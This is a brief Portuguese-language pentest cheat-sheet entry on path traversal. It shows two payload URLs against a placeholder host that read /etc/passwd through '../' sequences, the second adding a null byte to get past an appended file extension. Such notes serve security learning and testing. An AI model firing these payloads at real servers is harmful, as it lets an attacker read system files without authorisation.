# Path Traversal / Directory Traversal

É a possibilidade de visualizar arquivos e diretórios do servidor através de um parâmetro sem validação.

`http://www.alvo.com.br/logado.php?param=/../../../../etc/passwd`

## Bypass em extensões incluídas automáticamente

Algumas aplicações incluem uma extensão no final do valor do parâmetro enviado, para realizar um bypass envie um `null byte` no final do paylod.

`http://www.alvo.com.br/logado.php?param=/../../../../etc/passwd%00`